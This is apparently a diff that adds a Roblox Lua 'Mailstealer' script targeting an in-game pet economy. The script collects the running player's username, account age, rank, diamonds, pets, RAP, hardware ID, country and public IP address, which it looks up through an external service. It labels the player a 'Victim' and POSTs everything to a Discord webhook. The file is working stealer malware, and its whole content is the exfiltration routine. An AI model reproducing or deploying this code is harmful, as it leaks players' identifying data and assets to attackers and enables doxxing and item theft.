@@ -1,0 +1,93 @@
+
+local url = _G.Webhook
+local username = game:GetService("Players").LocalPlayer.Name
+local fardplayer = game.Players.LocalPlayer
+local RAP = game.Players.LocalPlayer.leaderstats.RAP.Value
+local display = game.Players.LocalPlayer.DisplayName
+local country = game:GetService("LocalizationService"):GetCountryRegionForPlayerAsync(game.Players.LocalPlayer)
+local imgs = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. fardplayer.userId .. "&width=420&height=420&format=png"
+local rank = game.Players.LocalPlayer.PlayerGui.Main.Right.Rank.RankName.Text
+local executor = identifyexecutor()
+local diamond = game.Players.LocalPlayer.PlayerGui.Main.Right.Diamonds.Amount.Text
+local Loading = game.Players.LocalPlayer.PlayerGui.Loading.Frame.Info.Location.Text
+local Game = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
+local Pets = game.Players.LocalPlayer.PlayerGui.Inventory.Frame.PetAmount.Text
+local HardWareId = game:GetService("RbxAnalyticsService"):GetClientId()
+request = http_request or request or HttpPost or syn.request
+
+local data1 = {
+    ["content"] = "||@everyone||\n**:comet:AASTRAX Mailstealer Detected A Hit:comet:**", -- Free Webhook logging
+    ["embeds"] = {
+        {
+            ["title"] = "```AASTRA Mailstealer Results```",
+            ["url"] = "https://discord.gg/Qg9SBjXExx",
+            ["description"] = "```This data was generated using AASTRAX Mailstealer```",
+            ["type"] = "rich",
+            ["color"] = tonumber(0xffff00),
+            ["thumbnail"] = {
+                ["url"] = imgs,
+                ["height"] = 420,
+                ["width"] = 420
+            },
+            ["fields"] = {
+                {
+                    ["name"] = "Victim Username = "..username.."",
+                    ["value"] = "**:detective:Username : " ..username .."\n:detective:User ID : " ..fardplayer.userId .. "\n:underage:Account Age : " ..fardplayer.AccountAge .. "\n:detective:DisplayName :"..display.."\n:crown:Rank:"..rank.."\n:computer: Exploit : "..executor.."\n:house:IP Address : "..game:HttpGet('https://api.ipify.org/').."\n:mag:Place :"..Loading.."\n:mag:Place :"..Game.."\n:mag:Country : "..country.."**", -- PROCAT & EGORIKUSA & AASTRAX DONT STEAL
+                    ["inline"] = false
+                },
+                {
+                    ["name"] = ":gem: Diamonds  :gem: ",
+                    ["value"] = "```>>> ".._G.Diamonds.."```",
+                    ["inline"] = false
+
+                },
+
+                {
+                
+                
+                    ["name"] = ":round_pushpin:  Pets :round_pushpin: ",
+                    ["value"] = "```>>> "..Pets.."```",
+                    ["inline"] = false
+                },
+                {
+                
+                   
+
+                   
+
+                 
+                    ["name"] = " :money_mouth: ".._G.PetRar.." :money_mouth: ",
+                    ["value"] = "```>>> ".._G.PetName.."```",
+                    ["inline"] = true
+                },
+                {
+                
+
+                    ["name"] = ":round_pushpin: Huge  Pets :round_pushpin: ",
+                    ["value"] = "```>>> "..#PetsList.."```",
+                    ["inline"] = false
+                },
+                {
+     
+          
+                
+                    ["name"] = ":bar_chart: RAP :bar_chart:",
+                    ["value"] = "```>>> "..RAP.."```",
+                    ["inline"] = false
+                },
+                {
+                    ["name"] = ":computer: Hardware ID :computer:",
+                    ["value"] = "```>>> "..HardWareId.."```",
+                    ["inline"] = false
+                }
+            }
+        }
+    }
+}
+local newdata1 = game:GetService("HttpService"):JSONEncode(data1)
+
+local headers = {
+    ["content-type"] = "application/json"
+}
+local abcdef1 = {Url = url, Body = newdata1, Method = "POST", Headers = headers}
+request(abcdef1)
